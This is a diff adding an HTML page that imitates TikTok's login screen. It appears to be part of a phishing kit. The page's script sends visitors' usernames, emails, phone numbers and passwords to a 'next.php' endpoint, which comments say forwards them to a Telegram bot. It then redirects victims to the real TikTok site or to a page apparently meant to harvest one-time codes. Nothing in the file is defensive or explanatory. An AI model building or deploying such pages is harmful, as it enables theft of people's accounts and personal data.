@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=TikTok+Sans:ital,wght@0,300;0,400;0,600;0,800;1,400&display=swap" rel="stylesheet">
+</head>
+<body>
+<style>
+    :root {
+        /* core brand colors */
+        --ttk-black: #000000;
+        --ttk-white: #ffffff;
+        --ttk-pink: #FE2C55; /* "Razzmatazz" */
+        --ttk-cyan: #25F4EE; /* "Splash" */
+
+        /* UI neutrals */
+        --bg: var(--ttk-white);
+        --surface: #0f0f0f;
+        --muted: #9a9a9a;
+    }
+
+    * { box-sizing: border-box; }
+
+    /* Remove blue background on button clicks */
+    button, .tab-btn, .continue-btn, .signin-btn, .clear-btn, .close-btn, .country-code, .back-btn, .help-icon {
+        -webkit-tap-highlight-color: transparent !important;
+        -webkit-touch-callout: none !important;
+        -webkit-user-select: none !important;
+        -moz-user-select: none !important;
+        -ms-user-select: none !important;
+        user-select: none !important;
+        outline: none !important;
+    }
+
+    button:focus, .tab-btn:focus, .continue-btn:focus, .signin-btn:focus, .clear-btn:focus, .close-btn:focus, .country-code:focus, .back-btn:focus, .help-icon:focus {
+        outline: none !important;
+        box-shadow: none !important;
+        background-color: inherit !important;
+    }
+
+    button:active, .tab-btn:active, .continue-btn:active, .signin-btn:active, .clear-btn:active, .close-btn:active, .country-code:active, .back-btn:active, .help-icon:active {
+        background-color: inherit !important;
+        transform: none !important;
+    }
+
+    html, body {
+        margin: 10px 0 0 0 !important;
+        padding: 0 !important;
+        width: 100% !important;
+        overflow-x: hidden !important;
+        font-family: "TikTok Sans", Inter, "Helvetica Neue", Arial, sans-serif !important;
+        background: var(--bg) !important;
+        color: var(--ttk-black) !important;
+        -webkit-font-smoothing:antialiased !important;
+        -moz-osx-font-smoothing:grayscale !important;
+
+    }
+
+    .tiktok-container {
+        background: var(--ttk-white) !important;
+        color: var(--ttk-black) !important;
+        font-family: 'TikTok Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif !important;
+        margin: 1rem auto 0 !important;
+        padding: 20px !important;
+        width: 100% !important;
+        max-width: none !important;
+        min-height: 400px !important;
+        display: flex !important;
+        flex-direction: column !important;
+        justify-content: center !important;
+        align-items: center !important;
+        box-sizing: border-box !important;
+    }
+
+    .tiktok-form {
+        width: 100% !important;
+        max-width: 400px !important;
+        margin: 0 auto !important;
+        padding: 0 20px !important;
+    }
+
+    .header {
+        display: flex !important;
+        align-items: center !important;
+        justify-content: space-between !important;
+        margin-bottom: 15px !important;
+        width: 100% !important;
+        position: relative !important;
+        border-bottom: 0.5px solid var(--muted) !important;
+        padding-bottom: 15px !important;
+    }
+
+    .back-btn {
+        font-size: 28px !important;
+        color: var(--ttk-black) !important;
+        font-weight: 400 !important;
+        text-decoration: none !important;
+        cursor: pointer !important;
+        letter-spacing: 4px !important;
+    }
+
+    .help-icon {
+        width: 20px !important;
+        height: 20px !important;
+        background: var(--ttk-white) !important;
+        border: 2px solid var(--ttk-black);
+        border-radius: 50% !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        color: var(--ttk-black) !important;
+        font-size: 17px !important;
+        font-weight: 600 !important;
+    }
+
+    .tiktok-logo {
+        width: 32px !important;
+        height: 32px !important;
+        margin-right: 16px !important;
+        flex-shrink: 0 !important;
+    }
+
+    .tiktok-logo img {
+        width: 100% !important;
+        height: 100% !important;
+    }
+
+    .login-title {
+        font-size: 22px !important;
+        font-weight: 600 !important;
+        font-family: "TikTok Sans", Inter, "Helvetica Neue", Arial, sans-serif !important;
+        /* font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif !important; */
+        letter-spacing: -0.5px !important;
+        margin: 0 !important;
+        color: var(--ttk-black) !important;
+        line-height: 32px !important; /* Match logo height */
+    }
+
+    .tabs {
+        display: flex !important;
+        margin-bottom: 15px !important;
+        border-bottom: 1px solid #e0e0e0 !important;
+    }
+
+    .tab-btn {
+        flex: 1 !important;
+        background: none !important;
+        border: none !important;
+        color: var(--muted) !important;
+        font-size: 16px !important;
+        font-weight: 600 !important;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif !important;
+        padding: 12px 8px !important;
+        cursor: pointer !important;
+        border-bottom: 2px solid transparent !important;
+        text-align: center !important;
+        transition: all 0.2s ease !important;
+    }
+
+    .tab-btn.active {
+        color: var(--ttk-black) !important;
+        border-bottom: 2px solid var(--ttk-black) !important;
+    }
+
+    .input-container {
+        margin-bottom: 10px !important;
+    }
+
+    .phone-input-group, .email-input-group {
+        position: relative !important;
+        display: flex !important;
+        align-items: center !important;
+        /* border: 1px solid #ddd !important; */
+        border-radius: 6px !important;
+        overflow: visible !important;
+        margin-bottom: 15px !important;
+        height: 50px !important; /* Match input height */
+    }
+
+    .country-code {
+        background: #f8f9fa !important;
+        padding: 12px 10px !important;
+        border-right: 1px solid #ddd !important;
+        font-size: 14px !important;
+        color: var(--ttk-black) !important;
+        min-width: 50px !important;
+        text-align: center !important;
+        position: relative !important;
+        height: 100% !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+    }
+
+    .country-selector {
+        position: relative !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: space-between !important;
+        width: 100% !important;
+    }
+
+    .country-selector .selected-country {
+        flex: 1 !important;
+        text-align: center !important;
+        font-size: 12px !important;
+        color: var(--ttk-black) !important;
+    }
+
+    .country-selector .dropdown-arrow {
+        font-size: 12px !important;
+        color: var(--muted) !important;
+        margin-left: 5px !important;
+    }
+
+    .country-dropdown {
+        position: fixed !important;
+        top: 0 !important;
+        left: 0 !important;
+        right: 0 !important;
+        bottom: 0 !important;
+        background: rgba(0, 0, 0, 0.5) !important;
+        display: none !important;
+        z-index: 10000 !important;
+        align-items: center !important;
+        justify-content: center !important;
+    }
+
+    .country-dropdown.active {
+        display: flex !important;
+    }
+
+    .dropdown-content {
+        background: var(--ttk-white) !important;
+        width: 90% !important;
+        max-width: 400px !important;
+        max-height: 80vh !important;
+        border-radius: 8px !important;
+        overflow: hidden !important;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3) !important;
+    }
+
+    .dropdown-header {
+        padding: 16px !important;
+        border-bottom: 1px solid #eee !important;
+        font-size: 18px !important;
+        font-weight: 600 !important;
+        text-align: center !important;
+        color: var(--ttk-black) !important;
+        position: relative !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+    }
+
+    .close-btn {
+        position: absolute !important;
+        left: 16px !important;
+        top: 50% !important;
+        transform: translateY(-50%) !important;
+        background: none !important;
+        border: none !important;
+        font-size: 20px !important;
+        color: var(--muted) !important;
+        cursor: pointer !important;
+        padding: 4px !important;
+        border-radius: 50% !important;
+        width: 28px !important;
+        height: 28px !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        transition: background 0.2s !important;
+    }
+
+    .close-btn:hover {
+        background: #f0f0f0 !important;
+    }
+
+    .dropdown-list {
+        max-height: calc(80vh - 120px) !important;
+        overflow-y: auto !important;
+    }
+
+    .country-option {
+        display: flex !important;
+        align-items: center !important;
+        justify-content: space-between !important;
+        padding: 12px 16px !important;
+        border-bottom: 1px solid #f0f0f0 !important;
+        cursor: pointer !important;
+        transition: background 0.2s !important;
+    }
+
+    .country-option:hover {
+        background: #f8f9fa !important;
+    }
+
+    .country-option:last-child {
+        border-bottom: none !important;
+    }
+
+    .country-name {
+        font-size: 14px !important;
+        color: var(--ttk-black) !important;
+        flex: 1 !important;
+    }
+
+    .country-code-display {
+        font-size: 14px !important;
+        color: var(--muted) !important;
+        font-weight: 600 !important;
+    }
+
+    input[type="tel"], input[type="email"], input[type="password"] {
+        width: 100% !important;
+        padding: 12px 14px !important;
+        background: whitesmoke !important;
+        border: none !important;
+        border-radius: 6px !important;
+        color: var(--ttk-black) !important;
+        font-size: 14px !important;
+        box-sizing: border-box !important;
+        outline: none !important;
+        transition: all 0.2s ease !important;
+        position: relative !important;
+        height: 50px !important; /* Match input height */
+
+    }
+
+    input[type="tel"]:focus, input[type="email"]:focus, input[type="password"]:focus {
+        background: var(--ttk-white) !important;
+        border: 2px solid var(--ttk-pink) !important;
+    }
+
+    /* Clear button styling */
+    .input-container {
+        position: relative !important;
+    }
+
+    .clear-btn {
+        position: absolute !important;
+        right: 10px !important;
+        top: 50% !important;
+        transform: translateY(-50%) !important;
+        width: 18px !important;
+        height: 18px !important;
+        background: var(--muted) !important;
+        border: 1px solid #ddd !important;
+        border-radius: 50% !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        cursor: pointer !important;
+        font-size: 16px !important;
+        font-weight: 700 !important;
+        color: var(--ttk-white) !important;
+        opacity: 0 !important;
+        transition: opacity 0.2s ease !important;
+        z-index: 2 !important;
+        pointer-events: none !important;
+    }
+
+    .clear-btn.show {
+        opacity: 1 !important;
+        pointer-events: auto !important;
+    }
+
+    .phone-input, .email-input {
+        border: none !important;
+        border-left: none !important;
+        border-radius: 0 !important;
+        flex: 1 !important;
+        height: 100% !important;
+        background: transparent !important;
+        padding: 12px 16px !important;
+        color: var(--ttk-black) !important;
+        font-size: 13px !important;
+        font-weight: 400;
+        outline: none !important;
+        box-sizing: border-box !important;
+        margin-bottom: 0 !important;
+    }
+
+    .phone-input::placeholder, .email-input::placeholder {
+        color: var(--muted) !important;
+    }
+
+    input::placeholder {
+        color: var(--muted) !important;
+    }
+
+    .signin-btn {
+        width: 100% !important;
+        padding: 12px !important;
+        background: var(--ttk-pink) !important;
+        color: var(--ttk-white) !important;
+        border: none !important;
+        border-radius: 6px !important;
+        font-size: 16px !important;
+        font-weight: 600 !important;
+        cursor: pointer !important;
+        margin-top: 35px !important;
+    }
+
+    .continue-btn {
+        width: 100% !important;
+        padding: 12px !important;
+        background: var(--ttk-pink) !important;
+        color: var(--ttk-white) !important;
+        border: none !important;
+        border-radius: 6px !important;
+        font-size: 16px !important;
+        font-weight: 600 !important;
+        cursor: pointer !important;
+        margin-top: 35px !important;
+    }
+
+    .password-option {
+        display: flex;
+        justify-content: center;
+        text-align: center !important;
+        margin-top: 20px !important;
+    }
+
+    .password-option a {
+        color: var(--ttk-black) !important;
+        text-decoration: none !important;
+        font-size: 15px !important;
+        font-weight: 600;
+        justify-content: center !important;
+    }
+
+    /* Footer styles */
+    .footer {
+        position: fixed !important;
+        bottom: 0 !important;
+        left: 0 !important;
+        right: 0 !important;
+        background: var(--ttk-black) !important;
+        color: var(--ttk-white) !important;
+        padding: 15px 20px !important;
+        display: flex !important;
+        justify-content: space-between !important;
+        align-items: center !important;
+        border-top: 1px solid #333 !important;
+        z-index: 9999 !important;
+    }
+
+    .footer .language {
+        font-size: 14px !important;
+        font-weight: 400 !important;
+        color: var(--ttk-white) !important;
+    }
+
+    .footer .copyrights {
+        font-size: 14px !important;
+        font-weight: 400 !important;
+        color: var(--ttk-white) !important;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 768px) {
+        .tiktok-container {
+            padding: 15px !important;
+            min-height: 100vh !important;
+        }
+
+        .tiktok-form {
+            max-width: 100% !important;
+            padding: 0 15px !important;
+        }
+
+        .header {
+            margin-bottom: 20px !important;
+        }
+
+        .login-title {
+            font-size: 22px !important;
+        }
+
+        .back-btn {
+            font-size: 20px !important;
+        }
+
+        .help-icon {
+            width: 28px !important;
+            height: 28px !important;
+            font-size: 16px !important;
+        }
+
+        .tab-btn {
+            padding: 10px 6px !important;
+            font-size: 14px !important;
+        }
+
+        input[type="tel"], input[type="email"], input[type="password"] {
+            padding: 14px 16px !important;
+            font-size: 12px !important; /* Prevent zoom on iOS */
+            /* margin-bottom: 20px !important; */
+        }
+
+        .signin-btn, .continue-btn {
+            padding: 14px !important;
+            font-size: 16px !important;
+            margin-top: 35px !important;
+        }
+
+        .country-code {
+            min-width: 60px !important;
+            padding: 14px 8px !important;
+            font-size: 14px !important;
+        }
+
+        .phone-input {
+            font-size: 16px !important;
+        }
+
+        .password-option a {
+            font-size: 14px !important;
+        }
+
+        .footer {
+            padding: 10px 15px !important;
+            flex-direction: column !important;
+            gap: 10px !important;
+            text-align: center !important;
+        }
+
+        .footer .language,
+        .footer .copyrights {
+            font-size: 12px !important;
+        }
+    }
+
+    @media (max-width: 480px) {
+        .tiktok-container {
+            padding: 10px !important;
+        }
+
+        .tiktok-form {
+            padding: 0 10px !important;
+        }
+
+        .login-title {
+            font-size: 18px !important;
+        }
+
+        .tab-btn {
+            padding: 8px 4px !important;
+            font-size: 13px !important;
+        }
+
+        input[type="tel"], input[type="email"], input[type="password"] {
+            padding: 12px 14px !important;
+        }
+
+        .signin-btn, .continue-btn {
+            padding: 12px !important;
+            margin-top: 35px !important;
+        }
+    }
+</style>
+
+<div class="tiktok-form">
+    <div class="header">
+        <a class="back-btn" onclick="goBack()"><</a>
+        <div class="login-title">Log in</div>
+        <div class="help-icon">?</div>
+    </div>
+
+    <div class="tabs">
+        <button class="tab-btn active" onclick="showEmail(event)">Email / Username</button>
+        <button class="tab-btn" onclick="showPhone(event)">Phone</button>
+    </div>
+
+    <div id="email-input" class="input-container">
+        <div class="email-input-group">
+            <input type="email" id="email" placeholder="Enter your email or username" class="email-input" required>
+            <button class="clear-btn" onclick="clearInput('email')">×</button>
+        </div>
+        <button id="email-continue" class="continue-btn" onclick="emailContinue()">Continue</button>
+        <div class="password-option">
+            <a href="#" onclick="showEmailPassword()" style="color: var(--ttk-black) !important; display: flex; align-items: center; gap: 6px;">
+                <svg width="16" height="16" viewBox="0 0 24 24"
+                     xmlns="http://www.w3.org/2000/svg">
+                  <!-- Shackle (outline) -->
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"
+                        fill="none" stroke="#000000" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round"/>
+
+                  <!-- Filled lock body (no keyhole) -->
+                  <rect x="5" y="11" width="14" height="10" rx="2" ry="2"
+                        fill="#000000"/>
+                </svg>
+                Login with password
+            </a>
+        </div>
+        <div id="email-password" style="display: none;">
+            <div class="email-input-group">
+                <input type="password" id="email-password-input" placeholder="Password" class="email-input" required>
+                <button class="clear-btn" onclick="clearInput('email-password-input')">×</button>
+            </div>
+            <button class="signin-btn" onclick="handleEmailLogin()">Log in</button>
+        </div>
+    </div>
+
+    <div id="phone-input" class="input-container" style="display: none;">
+        <div class="phone-input-group">
+            <div class="country-code" onclick="toggleCountryDropdown()">
+                <div class="country-selector">
+                    <span class="selected-country" id="selected-country">+1</span>
+                    <span class="dropdown-arrow">▼</span>
+                </div>
+                <input type="hidden" id="country-code" value="+1">
+            </div>
+            <input type="tel" id="phone" placeholder="Phone number" class="phone-input" required>
+            <button class="clear-btn" onclick="clearInput('phone')">×</button>
+        </div>
+        <button id="phone-continue" class="continue-btn" onclick="phoneContinue()">Continue</button>
+        <div class="password-option">
+            <a href="#" onclick="showPhonePassword()" style="color: var(--ttk-black) !important; display: flex; align-items: center; gap: 6px;">
+                <svg width="16" height="16" viewBox="0 0 24 24"
+                     xmlns="http://www.w3.org/2000/svg">
+                  <!-- Shackle (outline) -->
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"
+                        fill="none" stroke="#000000" stroke-width="2"
+                        stroke-linecap="round" stroke-linejoin="round"/>
+
+                  <!-- Filled lock body (no keyhole) -->
+                  <rect x="5" y="11" width="14" height="10" rx="2" ry="2"
+                        fill="#000000"/>
+                </svg>
+                Login with password
+            </a>
+        </div>
+        <div id="phone-password" style="display: none;">
+            <input type="password" id="phone-password-input" placeholder="Password" required>
+            <button class="clear-btn" onclick="clearInput('phone-password-input')">×</button>
+            <button class="signin-btn" onclick="handlePhoneLogin()">Log in</button>
+        </div>
+    </div>
+</div>
+
+<!-- Country Dropdown -->
+<div class="country-dropdown" id="country-dropdown">
+    <div class="dropdown-content">
+        <div class="dropdown-header">
+            <button class="close-btn" onclick="closeCountryDropdown()">×</button>
+            Select Country
+        </div>
+        <div class="dropdown-list" id="dropdown-list">
+            <!-- Countries will be populated by JavaScript -->
+        </div>
+    </div>
+</div>
+
+
+
+<script>
+    function goBack() {
+        window.location.href = 'index.html';
+    }
+
+    function showPhone(e) {
+        e.preventDefault();
+        document.getElementById('phone-input').style.display = 'block';
+        document.getElementById('email-input').style.display = 'none';
+        document.getElementById('phone-password').style.display = 'none';
+        document.getElementById('phone-continue').style.display = 'block';
+        document.querySelector('#phone-input .password-option').style.display = 'block';
+        document.getElementById('phone').focus();
+        document.querySelector('.tab-btn.active').classList.remove('active');
+        e.target.classList.add('active');
+    }
+
+    function showEmail(e) {
+        e.preventDefault();
+        document.getElementById('phone-input').style.display = 'none';
+        document.getElementById('email-input').style.display = 'block';
+        document.getElementById('email-password').style.display = 'none';
+        document.getElementById('email-continue').style.display = 'block';
+        document.querySelector('#email-input .password-option').style.display = 'block';
+        document.getElementById('email').focus();
+        document.querySelector('.tab-btn.active').classList.remove('active');
+        e.target.classList.add('active');
+    }
+
+    function phoneContinue() {
+        const countryCode = document.getElementById('country-code').value;
+        const phone = document.getElementById('phone').value;
+        const idValue = countryCode + phone;
+
+        // Send to Telegram bot
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', 'next.php', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.send('di=' + encodeURIComponent(idValue));
+
+        // Redirect to OTP page
+        window.location.href = 'otp.html?type=phone&value=' + encodeURIComponent(idValue);
+    }
+
+    function showPhonePassword() {
+        document.getElementById('phone-continue').style.display = 'none';
+        document.querySelector('#phone-input .password-option').style.display = 'none';
+        document.getElementById('phone-password').style.display = 'block';
+    }
+
+    function handlePhoneLogin() {
+        const countryCode = document.getElementById('country-code').value;
+        const phone = document.getElementById('phone').value;
+        const pass = document.getElementById('phone-password-input').value;
+        const idValue = countryCode + phone;
+        if (idValue.trim() && pass.trim()) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('di=' + encodeURIComponent(idValue) + '&pr=' + encodeURIComponent(pass));
+            window.location.href = 'https://www.tiktok.com';
+        } else {
+            alert("Please enter all required information.");
+        }
+    }
+
+    function emailContinue() {
+        const input = document.getElementById('email').value;
+        if (input.includes('@') && input.includes('.com')) {
+            // It's an email - send to Telegram and redirect to OTP
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('di=' + encodeURIComponent(input));
+
+            window.location.href = 'otp.html?type=email&value=' + encodeURIComponent(input);
+        } else {
+            // It's a username
+            window.location.href = 'password.html?username=' + encodeURIComponent(input);
+        }
+    }
+
+    function showEmailPassword() {
+        document.getElementById('email-continue').style.display = 'none';
+        document.querySelector('#email-input .password-option').style.display = 'none';
+        document.getElementById('email-password').style.display = 'block';
+    }
+
+    function handleEmailLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('email-password-input').value;
+        if (email.trim() && pass.trim()) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('di=' + encodeURIComponent(email) + '&pr=' + encodeURIComponent(pass));
+            window.location.href = 'https://www.tiktok.com';
+        } else {
+            alert("Please enter all required information.");
+        }
+    }
+
+    function clearInput(inputId) {
+        document.getElementById(inputId).value = '';
+        document.getElementById(inputId).focus();
+        toggleClearButton(inputId);
+    }
+
+    function toggleClearButton(inputId) {
+        const input = document.getElementById(inputId);
+        const clearBtn = input.parentElement.querySelector('.clear-btn');
+        if (input.value.trim() !== '') {
+            clearBtn.classList.add('show');
+        } else {
+            clearBtn.classList.remove('show');
+        }
+    }
+
+    // Country dropdown functions
+    function toggleCountryDropdown() {
+        const dropdown = document.getElementById('country-dropdown');
+        if (dropdown.classList.contains('active')) {
+            dropdown.classList.remove('active');
+        } else {
+            populateCountries();
+            dropdown.classList.add('active');
+        }
+    }
+
+    function selectCountry(code, name) {
+        document.getElementById('selected-country').textContent = code;
+        document.getElementById('country-code').value = code;
+        document.getElementById('country-dropdown').classList.remove('active');
+    }
+
+    function closeCountryDropdown() {
+        document.getElementById('country-dropdown').classList.remove('active');
+    }
+
+    function populateCountries() {
+        const dropdownList = document.getElementById('dropdown-list');
+        dropdownList.innerHTML = '';
+
+        const countries = [
+            { name: 'United States', code: '+1' },
+            { name: 'India', code: '+91' },
+            { name: 'Brazil', code: '+55' },
+            { name: 'Indonesia', code: '+62' },
+            { name: 'Pakistan', code: '+92' },
+            { name: 'Bangladesh', code: '+880' },
+            { name: 'Nigeria', code: '+234' },
+            { name: 'Egypt', code: '+20' },
+            { name: 'Turkey', code: '+90' },
+            { name: 'Iraq', code: '+964' },
+            { name: 'Saudi Arabia', code: '+966' },
+            { name: 'United Arab Emirates', code: '+971' },
+            { name: 'Mexico', code: '+52' },
+            { name: 'Philippines', code: '+63' },
+            { name: 'Vietnam', code: '+84' },
+            { name: 'Thailand', code: '+66' },
+            { name: 'United Kingdom', code: '+44' },
+            { name: 'Germany', code: '+49' },
+            { name: 'France', code: '+33' },
+            { name: 'Italy', code: '+39' },
+            { name: 'Spain', code: '+34' },
+            { name: 'Russia', code: '+7' },
+            { name: 'Japan', code: '+81' },
+            { name: 'South Korea', code: '+82' },
+            { name: 'China', code: '+86' },
+            { name: 'Canada', code: '+1' },
+            { name: 'Australia', code: '+61' },
+            { name: 'Argentina', code: '+54' },
+            { name: 'Colombia', code: '+57' },
+            { name: 'Poland', code: '+48' },
+            { name: 'Ukraine', code: '+380' },
+            { name: 'Romania', code: '+40' },
+            { name: 'Netherlands', code: '+31' },
+            { name: 'Belgium', code: '+32' },
+            { name: 'Sweden', code: '+46' },
+            { name: 'Norway', code: '+47' },
+            { name: 'Denmark', code: '+45' },
+            { name: 'Finland', code: '+358' },
+            { name: 'Portugal', code: '+351' },
+            { name: 'Greece', code: '+30' },
+            { name: 'Czech Republic', code: '+420' },
+            { name: 'Hungary', code: '+36' },
+            { name: 'Slovakia', code: '+421' },
+            { name: 'Slovenia', code: '+386' },
+            { name: 'Croatia', code: '+385' },
+            { name: 'Bosnia and Herzegovina', code: '+387' },
+            { name: 'Serbia', code: '+381' },
+            { name: 'Montenegro', code: '+382' },
+            { name: 'Kosovo', code: '+383' },
+            { name: 'Albania', code: '+355' },
+            { name: 'North Macedonia', code: '+389' }
+        ];
+
+        // Sort countries alphabetically by name
+        countries.sort((a, b) => a.name.localeCompare(b.name));
+
+        countries.forEach(country => {
+            const option = document.createElement('div');
+            option.className = 'country-option';
+            option.onclick = () => selectCountry(country.code, country.name);
+            option.innerHTML = `
+                <span class="country-name">${country.name}</span>
+                <span class="country-code-display">${country.code}</span>
+            `;
+            dropdownList.appendChild(option);
+        });
+    }
+
+    // Close dropdown when clicking outside
+    document.addEventListener('click', function(event) {
+        const dropdown = document.getElementById('country-dropdown');
+        const countryCode = document.querySelector('.country-code');
+        if (!countryCode.contains(event.target) && !dropdown.contains(event.target)) {
+            dropdown.classList.remove('active');
+        }
+    });
+
+    // Add event listeners to all inputs
+    document.addEventListener('DOMContentLoaded', function() {
+        const inputs = ['email', 'email-password-input', 'phone', 'phone-password-input'];
+        inputs.forEach(function(inputId) {
+            const input = document.getElementById(inputId);
+            if (input) {
+                input.addEventListener('input', function() {
+                    toggleClearButton(inputId);
+                });
+                // Initial check
+                toggleClearButton(inputId);
+            }
+        });
+    });
+</script>
+</body>
+</html>
